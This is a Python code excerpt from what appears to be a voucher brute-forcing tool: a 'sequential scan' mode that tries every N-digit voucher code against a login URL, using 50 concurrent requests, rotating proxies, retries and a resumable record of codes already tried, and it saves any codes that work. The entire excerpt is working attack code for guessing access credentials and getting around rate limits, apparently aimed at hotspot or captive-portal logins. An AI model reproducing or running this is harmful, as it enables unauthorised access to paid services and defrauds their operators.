    # ========== MODE 2: SCAN ==========
    async def scan_voucher_mode(self, login_url):
        min_val, max_val = self.get_min_max()
        total = (10**self.length) - (10**(self.length-1))
        print(f"\n{CYAN}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"{GREEN}🚀{RESET} Mode 2: Sequential Scan ({self.length} digits)")
        print(f"{BLUE}[*]{RESET} Range: {min_val:,} → {max_val:,}")
        print(f"{BLUE}[*]{RESET} Total: {total:,} vouchers")
        print(f"{CYAN}═══════════════════════════════════════════════════════════════{RESET}")
        tested = load_tested()
        if tested: print(f"{GREEN}[+]{RESET} Loaded {len(tested)} tested (will skip)")
        checked = found = expired = retry_count = error_count = 0
        start_time = time.time()
        semaphore = asyncio.Semaphore(50)
        async def check_with_semaphore(voucher):
            nonlocal retry_count
            async with semaphore:
                proxy = self.proxy_manager.get_next_proxy() if self.use_proxy else None
                result, redirect = await self.check_voucher(login_url, voucher, proxy)
                if result == "retry":
                    retry_count += 1
                    for _ in range(2):
                        await asyncio.sleep(0.5)
                        result, _ = await self.check_voucher(login_url, voucher, proxy)
                        if result != "retry": break
                return result
        if not await self.check_url(login_url):
            print(f"{RED}❌ URL not ready!{RESET}")
            await self.wait_for_url(login_url)
        last_update = time.time()
        for voucher in range(min_val, max_val+1):
            v_str = str(voucher)
            checked += 1
            if v_str in tested: continue
            if checked % 500 == 0:
                if not await self.check_url(login_url):
                    print(f"\n{YELLOW}[!] URL lost! Waiting...{RESET}")
                    await self.wait_for_url(login_url)
            result = await check_with_semaphore(v_str)
            if result == "found":
                found += 1
                save_found(v_str)
                print(f"\n{GREEN}✅✅✅ FOUND: {v_str}{RESET}")
            elif result == "expired": expired += 1
            elif result == "error": error_count += 1
            save_tested(v_str)
            now = time.time()
            if now - last_update >= 0.5:
                elapsed = now - start_time
                speed = int(checked / elapsed * 60) if elapsed > 0 else 0
                pct = (checked / total) * 100
                eta = ((total - checked) / max(speed,1)) / 60 if speed > 0 else 0
                sys.stdout.write('\033[10A')
                sys.stdout.write('\033[J')
                print(f"\n{BLUE}🔍{RESET} Scanning {self.length}-digit Codes...")
                print(f"{YELLOW}📦{RESET} Checked: {checked:,}/{total:,}")
                print(f"{YELLOW}📊{RESET} Progress: {pct:.2f}%")
                print(f"{YELLOW}⏱️{RESET} ETA: {eta:.1f} mins")
                print(f"{YELLOW}⚡{RESET} Speed: {speed:,} codes/min")
                print(f"{YELLOW}✅{RESET} Found: {found}")
                print(f"{YELLOW}⏭️{RESET} Expired: {expired}")
                print(f"{YELLOW}🔄{RESET} Retries: {retry_count}")
                print(f"{YELLOW}❌{RESET} Errors: {error_count}")
                icon = "🚀 Full Speed" if speed > 8000 else "⚡ Fast" if speed > 4000 else "🐢 Slow"
                print(f"{YELLOW}🟢{RESET} Status: {icon}")
                print(f"{CYAN}{print_progress_bar(pct)}{RESET}")
                sys.stdout.flush()
                last_update = now
            await asyncio.sleep(0.01 if error_count <= 20 else 0.05)
        print(f"\n{GREEN}✅ Scan Complete! Found: {found}{RESET}")

